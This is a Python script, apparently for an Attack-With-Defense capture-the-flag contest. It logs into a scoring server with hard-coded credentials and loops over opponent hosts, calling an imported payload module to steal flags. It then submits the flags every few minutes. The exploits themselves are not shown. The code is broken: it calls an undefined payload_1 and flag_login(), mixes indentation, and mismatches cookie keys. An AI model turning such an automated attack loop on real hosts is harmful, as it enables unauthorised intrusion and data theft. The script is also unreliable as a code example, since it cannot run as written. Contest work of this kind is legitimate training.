# coding: utf-8
from PIL import Image
import requests
import sys
import re
sys.path.append("E://LX//awd//payload")
import payload_2

s = requests.session()

d_data = {
	"user":"user001",
	"password":"yYzwL7gCEMKN3dU",
	"Headers":{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"},
	"cookies":"",
	"flag_url":"http://192.168.128.132:8080/flag_file.php?token=team1&flag=", #flag提交地址
	"base_url":"http://114.116.154.135/",   #登录地址
	"yzm_url":""   #验证码地址
}

host_list = []
port = "80"


for host in range(132,133):
	host_list.append("192.168.128." + str(host))          #根据实际情况更改

def login():                                                                                
    global  s,host_list,port,d_data
    pdata = {'adminname':d_data["user"],"adminpassword":d_data["password"],"yzm":""}   #根据实际情况更改提交参数

    try:
    	req = s.post(d_data['base_url'], data=pdata, headers = d_data['Headers'])
    	d_data['Cookies'] = req.cookies
    	payload_1.get_flag(s,host_list,port,d_data)
    except:
    	code = s.get(d_data["yzm_url"],headers = d_data["Headers"]).content
    	with open("./login_codes.jpg","wb") as image:
    		image.write(code)
    	code_img = Image.open("./login_codes.jpg")
    	code_img.show()
    	pdata["yzm"] = input("验证码: ")
    	req = s.post(d_data['base_url'], data=pdata, headers = d_data['Headers'])
    	d_data['Cookies'] = req.cookies
    	payload_1.get_flag(s,host_list,port,d_data)                      #目前payload就写了POST跟GET

def post_flag():
	global s,host_list,port,d_data
	with open("./flag.txt","r") as files:
		for line in files.readlines():
			flag = line.strip()[44:].strip()
			try:
				flag_url = d_data["flag_url"] + flag
				res = s.get(flag_url)
				print(res.content)
			except:
				try:
					pdata = {'flag':flag,"yzm":""}
					code = s.get(d_data["yzm_url"],headers = d_data["Headers"]).content
			    	with open("./post_codes.jpg","wb") as image:
			    		image.write(code)
			    	code_img = Image.open("./post_codes.jpg")
			    	code_img.show()
			    	pdata["yzm"] = input("验证码: ")
			    	res = s.post(d_data["flag_url"],data = pdata,headers = d_data["Headers"])
					print(res.content)
				except:
					print("请检查参数！！！")

times = s.get(d_data["base_url"]).headers['Date']
print("flag_server_time :  " + times)

while True:
	flag_login()
	time_s = s.get(d_data["base_url"]).headers['Date'].split(" ")[4].split(":")[1]
	if int(time_s) % 5 == 0:
		times = s.get(d_data["base_url"]).headers['Date']
		print("flag_server_time :  " + times)
		login()
		payload_2.get_flag(s,host_list,port,d_data)
		post_flag()
